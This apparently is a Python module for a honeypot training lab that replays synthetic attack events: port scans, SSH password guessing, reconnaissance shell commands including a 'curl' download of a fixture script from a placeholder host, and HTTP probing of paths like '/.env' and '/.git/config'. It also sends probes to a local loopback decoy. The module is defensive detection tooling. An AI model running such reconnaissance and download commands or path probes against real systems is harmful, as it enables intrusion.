import asyncio
import uuid
from datetime import datetime,timezone,timedelta
from urllib.request import Request,urlopen
from .schemas import EventInput,utcnow

SCENARIOS=[
    {'id':'mixed','name':'Guided investigation','description':'A complete replay: scan, login guessing, shell commands and HTTP enumeration.','duration':'~18 sec','event_source':'REPLAY'},
    {'id':'scan','name':'TCP port scan','description':'16 distinct destination ports in a bounded window.','duration':'~5 sec','event_source':'REPLAY'},
    {'id':'auth','name':'Authentication guessing','description':'Eight failed SSH logins against synthetic accounts.','duration':'~3 sec','event_source':'REPLAY'},
    {'id':'shell','name':'Shell investigation','description':'Inert reconnaissance and download-intent commands.','duration':'~3 sec','event_source':'REPLAY'},
    {'id':'http','name':'HTTP enumeration','description':'Fourteen requests across decoy paths.','duration':'~5 sec','event_source':'REPLAY'},
    {'id':'control','name':'Low-interaction control','description':'A small control session below alert thresholds.','duration':'~1 sec','event_source':'REPLAY'}]

def scenario_events(scenario,base=None,prefix=None,source_index=0):
    base=base or datetime.now(timezone.utc); prefix=prefix or uuid.uuid4().hex[:10]
    kinds=['scan','auth','shell','http','control'] if scenario=='mixed' else [scenario]; output=[]
    for kindex,kind in enumerate(kinds):
        ip=f'203.0.113.{10+(source_index+kindex)%80}'; session=f'lab-{prefix}-{kind}'
        if kind=='scan': specs=[('tcp_probe','TCP',p,f'TCP SYN observation to port {p}',{}) for p in [21,22,23,25,53,80,110,139,143,443,445,993,1433,3306,8080,8443]]
        elif kind=='auth': specs=[('auth_failure','SSH',2222,'SSH authentication failed',{'username':name}) for name in ['root','admin','pi','root','guest','admin','test','pi']]
        elif kind=='shell': specs=[('auth_success','SSH',2222,'Emulated login accepted',{'username':'root'})]+[('command','SSH',2222,command,{}) for command in ['whoami','uname -a','ls /var/log','cat /etc/os-release','curl https://example.invalid/fixture.sh','crontab -l']]
        elif kind=='http': specs=[('http_request','HTTP',8080,'GET '+path,{'method':'GET','path':path,'status':404}) for path in ['/admin','/login','/.env','/wp-admin','/config','/backup.zip','/.git/config']*2]
        else: specs=[('connection','SSH',2222,'Control connection opened',{}),('auth_failure','SSH',2222,'Control login failed',{'username':'student'}),('connection','SSH',2222,'Control connection closed',{})]
        for index,(event_kind,protocol,port,detail,metadata) in enumerate(specs):
            output.append(EventInput(event_id=f'{prefix}-{kind}-{index}',sensor_id='replay-lab',source='lab-replay',timestamp=base+timedelta(seconds=kindex*8+index*.4),kind=event_kind,protocol=protocol,source_ip=ip,source_port=49000+kindex,destination_port=port,session_id=session,detail=detail,metadata={**metadata,'scenario':kind,'fixture':'Synthetic controlled replay; no remote attack executed.'}))
    return output

class Lab:
    def __init__(self,service,store,settings): self.service=service; self.store=store; self.settings=settings; self.runs={}; self.tasks={}

    def seed(self,force=False):
        if not force and self.store.one("SELECT COUNT(*) n FROM events WHERE mode='REPLAY'")['n']: return
        base=datetime.now(timezone.utc)
        for index in range(20):
            kind=['scan','auth','http','shell','control'][index%5]
            self.service.ingest(scenario_events(kind,base-timedelta(minutes=55-index*2.5),prefix=f'welcome-{uuid.uuid4().hex[:5]}-{index}',source_index=index*3),'REPLAY')
        with self.store.transaction() as db: self.store.audit(db,'system','seed-generated-replay','replay-lab','Explicit synthetic onboarding fixture; LIVE is untouched.')

    def start(self,scenario):
        if any(x['status']=='running' for x in self.runs.values()): raise ValueError('A replay is already running. Stop it before starting another.')
        for old_id in list(self.runs)[:-24]:
            if self.runs[old_id]['status']!='running':
                self.runs.pop(old_id,None); self.tasks.pop(old_id,None)
        run_id='RUN-'+uuid.uuid4().hex[:8].upper()
        self.runs[run_id]={'id':run_id,'scenario':scenario,'mode':'REPLAY','status':'running','sent':0,'total':0,'started_at':utcnow()}
        self.tasks[run_id]=asyncio.create_task(self._play(run_id,scenario))
        return self.runs[run_id]

    async def _play(self,run_id,scenario):
        events=scenario_events(scenario,base=datetime.now(timezone.utc)-timedelta(seconds=40))
        self.runs[run_id]['total']=len(events)
        try:
            for event in events:
                await asyncio.to_thread(self.service.ingest,[event],'REPLAY')
                self.runs[run_id]['sent']+=1
                await asyncio.sleep(.32)
            self.runs[run_id]['status']='completed'
        except asyncio.CancelledError: self.runs[run_id]['status']='cancelled'
        except Exception as exc: self.runs[run_id].update(status='failed',error=str(exc))
        finally:
            with self.store.transaction() as db:
                self.store.audit(db,'analyst','lab-run',run_id,self.runs[run_id]['status']); self.store.change(db,'lab',run_id)

    def stop(self,run_id):
        if run_id not in self.runs: raise KeyError(run_id)
        if self.runs[run_id]['status']=='running': self.tasks[run_id].cancel()
        return self.runs[run_id]

    async def close(self):
        tasks=list(self.tasks.values())
        for task in tasks:
            if not task.done(): task.cancel()
        if tasks: await asyncio.gather(*tasks,return_exceptions=True)

    def live_probe(self):
        if not self.settings.decoy_enabled: raise ValueError('The local HTTP decoy is disabled')
        count=0
        for path in ['/admin','/login','/.env','/wp-admin','/config','/backup.zip','/.git/config']*2:
            try:
                with urlopen(f'http://127.0.0.1:{self.settings.decoy_port}{path}',timeout=3) as response: response.read(4096)
            except Exception as exc:
                if getattr(exc,'code',None) not in (403,404): raise
            count+=1
        for _ in range(6):
            req=Request(f'http://127.0.0.1:{self.settings.decoy_port}/login',data=b'username=lab-student&password=synthetic-only',headers={'Content-Type':'application/x-www-form-urlencoded'})
            try:
                with urlopen(req,timeout=3) as response: response.read(4096)
            except Exception as exc:
                if getattr(exc,'code',None) not in (401,403): raise
            count+=1
        with self.store.transaction() as db: self.store.audit(db,'analyst','live-loopback-probe','software-lab',f'{count} requests to fixed loopback decoy')
        return {'requests':count,'mode':'LIVE','target':f'http://127.0.0.1:{self.settings.decoy_port}','scope':'Actual local HTTP requests; no Raspberry Pi or remote network was used.'}
